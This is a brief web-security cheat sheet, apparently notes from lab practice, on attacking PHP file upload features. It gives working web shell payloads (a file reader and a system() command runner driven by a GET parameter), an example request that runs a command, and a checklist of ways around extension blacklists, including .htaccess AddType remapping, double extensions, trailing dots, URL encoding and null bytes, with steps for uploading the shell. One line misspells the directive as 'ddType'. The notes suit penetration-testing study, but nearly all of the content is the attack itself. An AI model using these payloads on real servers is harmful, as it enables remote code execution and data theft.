`<?php echo file_get_contents('/path/to/target/file'); ?>`
`<?php echo system($_GET['command']); ?>`
`GET /example/exploit.php?command=id HTTP/1.1`

# Checklist
- Directory Traversal Upload
- Extension blacklist bypass
	- `.htaccess` -> `ddType application/x-httpd-php .l33t`
		- Executes `.l33t` as PHP
- Provide multiple extensions
	- `exploit.php.jpg`
- Add trailing characters
	- `exploit.php.`
- URL encoding (or double URL encoding)
	- `exploit%2Ephp`
- Add semicolons or URL-encoded null byte characters

### Extension blacklist bypass
- Change the value of the `filename` parameter to `.htaccess`.
- Change the value of the `Content-Type` header to `text/plain`.
- Replace the contents of the file (your PHP payload) with the following Apache directive:
    
    `AddType application/x-httpd-php .l33t`
    
    >This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.
    
- Upload `exploit.l33t` as PHP webshell